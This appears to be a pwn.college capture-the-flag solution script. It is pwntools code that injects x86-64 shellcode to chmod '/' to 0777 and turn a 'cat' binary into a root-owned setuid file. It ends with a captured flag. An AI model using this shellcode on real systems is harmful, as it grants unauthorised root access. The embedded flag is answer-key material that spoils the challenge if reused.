from re import T
from pwn import *

b = context.binary = ELF('/challenge/' + os.getenv('CHALLENGE_NAME'))

x = asm('''
xor rax, rax
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
xor r10, r10
xor r8, r8
mov rax, 0x5A
mov rdi, 0x2F
mov [rsp], rdi
lea rdi, [rsp]
mov rsi, 0777
syscall
mov rdi, 60
mov [rsp], rdi
lea rdi, [rsp]
mov rax, 0x23
mov rsi, 0
syscall
mov rax, 0x5C
mov rdi, 0x746163
mov [rsp], rdi
lea rdi, [rsp]
mov rsi, 0
syscall
mov rax, 0x5A
lea rdi, [rsp]
mov rsi, 0004777
syscall
''', extract=True)

p = process([b.path, '/home/hacker'])
p.send(x)
p.interactive()

# pwn.college{k4M6vAnkq8kiCy2B70uV26Ix4kh.QX4MjMsgTNwYzW}